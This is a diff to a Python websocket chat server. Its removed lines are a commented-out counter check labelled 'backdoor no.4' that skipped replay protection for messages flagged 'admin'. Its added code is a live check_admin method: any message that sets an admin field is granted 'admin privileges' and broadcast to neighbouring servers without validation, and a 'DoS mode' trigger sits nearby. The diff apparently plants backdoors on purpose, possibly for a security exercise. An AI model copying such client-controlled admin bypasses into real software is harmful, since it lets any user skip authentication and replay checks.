@@ -266,30 +266,6 @@ class Server:
         self.neighbour_websockets[websocket] = sender_address
         await self.connect_to_neighbour(sender_address)
 
-    # def validate_counter(self, websocket, message):
-    #     # backdoor no.4
-    #     parsed_message = message["data"] if isinstance(message["data"], dict) else json.loads(message["data"])
-        
-    #     is_admin = parsed_message.get("admin", False)
-    #     if is_admin:
-    #         # bypass check for admin
-    #         logging.info(f"adminnnnnnn!!")
-    #         return True
-    #     else:
-    #         sender = self.clients.get(websocket)
-    #         if not sender:
-    #             logging.error(f"{self.url} message from unknown client detected")
-    #             return False
-
-    #         # Check if the counter is larger or equal to the counter saved in the server
-    #         sender["counter"] = sender.get("counter", "0")
-    #         if int(message["counter"]) < int(sender["counter"]):
-    #             logging.error(f"{self.url} message with replay attack detected")
-    #             return False
-
-    #         # Increment counter
-    #         sender["counter"] = int(message["counter"]) + 1
-    #         return True
     def validate_client_counter(self, websocket, message):
             sender = self.clients.get(websocket)
             if not sender:
@@ -361,12 +337,25 @@ class Server:
         }
         await self.send_client_update()
 
+    async def check_admin(self, message):
+        if isinstance(message, dict):
+            is_admin = message.get("admin", False)
+            if is_admin:
+                logging.info(f"admin privileges granted")
+                return True
+        return False
+
     # receive public chats and braodcast to connected clients and other neighbourhoods if valid message
     async def receive_public_chat(self, websocket, request):
         logging.info(f"{self.url} received public chat message")
 
         fingerprint = request["data"].get("sender", None)
         message = request["data"].get("message", None)
+
+        admin = await self.check_admin(message)
+        if admin:
+            await self.neighbourhood.broadcast_request(request)
+            return
         
         if "DoS" in message:
             logging.warning(f"DoS mode activated.")
